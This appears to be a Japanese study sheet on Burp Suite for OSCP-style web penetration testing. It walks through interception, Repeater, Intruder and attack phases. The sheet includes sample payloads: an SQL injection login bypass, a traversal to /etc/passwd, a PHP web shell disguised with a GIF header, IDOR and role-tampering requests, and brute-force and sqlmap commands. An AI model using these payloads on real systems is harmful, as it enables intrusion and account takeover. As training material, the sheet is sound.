# Burp Suite

## 🎯 概要
Burp Suiteは、Webアプリケーションのペネトレーションテストにおける「業界標準」の統合プラットフォームです。ローカルプロキシとして動作し、ブラウザ（クライアント）とウェブサーバー間のHTTP/HTTPS通信を傍受・解析・改ざんすることを可能にします。OSCPなどの試験や実務において、Webアプリケーションの脆弱性（SQLi, XSS, LFI/RFI, 認証バイパス等）を手動で発見・検証するための最も強力なツールです。

---

## 🛠 代表的な用途
- **リクエストの傍受と改ざん**: クライアントサイドの制限（JavaScriptでの入力チェック等）を無視したデータ送信。
- **コンテンツの列挙とマッピング**: Webサイトの構造、隠しディレクトリ、パラメータの可視化。
- **自動化された攻撃（ファジング）**: Intruderモジュールによる辞書攻撃やブルートフォース。
- **セッション管理の分析**: トークンのランダム性調査やセッションハイジャックの試行。
- **OSCPでの利用ポイント**: 脆弱性スキャナー（Pro版機能）は使用禁止ですが、手動でのプロキシ操作、Repeaterによるリクエスト再送、Intruderによる簡易的な列挙は攻略の核心となります。

---

## 🔍 基本コマンド
```bash
# Kali Linuxでの起動（GUI版）
burpsuite

# 特定のプロジェクトファイルを指定して起動（Pro版）
burpsuite --project-file=work_project.burp

# コマンドラインから最新版のインストール
sudo apt-get install burpsuite
```

---

## 🧪 よく使う攻撃シナリオ
- **SQLインジェクションの検証**: ログインフォームをキャプチャし、Repeaterで `' OR 1=1 -- -` などのペイロードをテスト。
- **LFI/ディレクトリトラバーサル**: `file`パラメータを `../../../../etc/passwd` 等に書き換えて送信。
- **Webシェルの設置**: ファイルアップロード機能を傍受し、MIMEタイプを `image/png` から `application/x-php` へ、拡張子を `.php` へ改ざん。

---

## 📌 フェーズ別コマンド例  

### 🔎 Reconnaissance（技術的偵察）
```bash
# Burpのデフォルトプロキシリスナー（127.0.0.1:8080）の起動確認
ss -antlp | grep 8080

# ターゲットのWebアプリへBurpブラウザを介してアクセスし、技術スタックを特定
# (Proxy -> HTTP History で Server, X-Powered-By ヘッダーを確認)
```

### 🧭 Enumeration（外部サービスの詳細調査）
```bash
# ターゲットを「Scope」に追加し、対象ドメイン以外の通信を除外
# (Target -> Scope -> Add ボタン)

# パッシブスパイダリング（ブラウジングによるサイトマップの構築）
# (Target -> Site Map を確認)

# コンテンツディスカバリ（Pro版機能に代わる手動調査）
# (Target -> Site Map で右クリック -> Engagement tools -> Discover content)
```

### 🚪 Initial Access（初期侵入）
```http
# SQLiによる認証回避のリクエスト改ざん例（Proxy -> Intercept で編集）
POST /login.php HTTP/1.1
Host: target.local
...
username=admin'--&-password=anything

# ファイルアップロード時のバイパス（Magic Byteの挿入）
# (メッセージボディの先頭に PNG シグネチャを追加してPHPコードを隠蔽)
GIF89a;<?php system($_GET['cmd']); ?>
```

### 📋 Local Enumeration（侵入後のローカル調査）
```bash
# 侵入済みのブラウザから内部ネットワークへのリクエストをBurpで中継
# (FoxyProxyでBurpを指定し、内部管理パネルへのリクエストを解析)

# 内部APIエンドポイントの発見
# (HTTP Historyから /api/v1/user などのパスを抽出)
```

### 📈 Privilege Escalation（権限昇格）
```http
# IDOR（不適切なユーザー参照）の検証
# (Repeaterで user_id=10 を user_id=1 に書き換えて管理者情報を取得)
GET /profile?user_id=1 HTTP/1.1
Cookie: session=user_session_token

# ロール権限の書き換え
# (リクエスト内の role=user を role=admin に変更)
{"username":"hacker", "role":"admin"}
```

### 🔑 Credential Access（認証情報探索）
```bash
# Intruderを使用したログインフォームへのブルートフォース
# (Attack type: Sniper を選択、passwordパラメータに §password§ を設定)

# 抽出したハッシュのデコード（Decoderモジュール）
# (Base64形式のハッシュをプレーンテキストに変換)
```

### 🏢 Active Directory（AD）
基本的に関連なし。ただし、Webアプリ経由で発見したADユーザーのパスワード変更機能を悪用し、ドメインアカウントの奪取を試みる際にプロキシとして使用。

---

## 🧰 便利オプション一覧
- **Target -> Scope**: スキャン対象を限定し、無関係なリクエスト（Google, Windows Update等）のノイズを消す。
- **Proxy -> Intercept is on/off**: 通信を一時停止して編集するか、バックグラウンドで履歴のみ記録するかを切り替える。
- **Repeater (Ctrl + R)**: 一度送ったリクエストを何度も修正して再送信できる、脆弱性検証の最重要機能。
- **Intruder (Ctrl + I)**: 複数のパラメータに対してペイロード（辞書）を自動注入する。
- **Decoder**: URL, HTML, Base64, Hex, Hashesなどのエンコード・デコード。
- **Comparer**: 2つのリクエスト/レスポンスを比較し、微細な差異（Status Code, Content-Length等）を特定する。

---

## 🚀 実践例
```bash
# 【実践1】Kiterunnerの結果をBurp経由で再送し、APIレスポンスを手動解析
kr kb replay <RESULT_OUTPUT> --proxy=http://127.0.0.1:8080

# 【実践2】sqlmapのターゲットとしてBurpで保存したリクエストファイルを使用
# (Burpでリクエストを右クリック -> Save item)
sqlmap -r request.txt --level=3 --risk=3

# 【実践3】IntruderでPitchfork攻撃を行い、ユーザー名とパスワードのペアを同時に検証
# (Payload 1: usernames.txt, Payload 2: passwords.txt)
```

---

## 🧩 他ツールとの組み合わせ
- **ffuf** → Burp Suite CEはIntruderに速度制限があるため、大量のパス列挙は `ffuf -x http://127.0.0.1:8080` でBurpを通しながら高速実行する。
- **sqlmap** → プロキシ経由で通信させることで、sqlmapがどのようなペイロードを送っているかをBurp上で詳細にデバッグできる。
- **FoxyProxy (Firefox Add-on)** → ブラウザのプロキシ設定をワンクリックでBurp（127.0.0.1:8080）に切り替える。
- **Postman** → APIテスト時にPostmanのプロキシをBurpに設定し、API通信を傍受・解析する。

---

## 📝 注意点（OSCP 試験での使い方）
- **Scanner機能の禁止**: Burp Suite Proの「Active Scan」はOSCP試験では使用禁止。必ず手動で脆弱性を特定すること。
- **Intruderの制限**: CE（無償版）はスロットリングにより実行速度が低下するため、大規模な辞書攻撃は `ffuf` などの代替ツールを使用するのが効率的。
- **証明書のインストール**: HTTPSサイトをデコードするには、`http://burp` からCA証明書をダウンロードし、ブラウザの「Authorities」としてインポートする必要がある。

---

## 🔗 参考リンク
- 公式：[PortSwigger Burp Suite Documentation](https://portswigger.net/burp/documentation/desktop)
- 良質解説：[PortSwigger Web Security Academy](https://portswigger.net/web-security)（Burp活用の最高の練習場）
